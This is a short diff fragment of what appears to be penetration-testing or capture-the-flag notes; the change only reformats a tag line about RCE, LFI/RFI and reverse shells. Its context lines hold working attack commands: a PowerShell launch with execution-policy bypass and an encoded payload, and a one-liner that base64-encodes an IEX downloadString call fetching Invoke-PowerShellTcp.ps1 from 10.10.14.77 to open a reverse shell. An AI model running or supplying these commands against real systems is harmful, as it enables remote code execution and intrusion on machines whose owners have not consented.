@@ -59,4 +59,4 @@ cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGU
 echo "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.77/Invoke-PowerShellTcp.ps1\")" | iconv --to-code UTF-16LE | base64 -w 0
 ```
 
-tags: rce reverse_shell LFI RFI powershell rce2shell
+tags: #rce #reverse_shell #lfi #rfi #powershell #rce2shell 
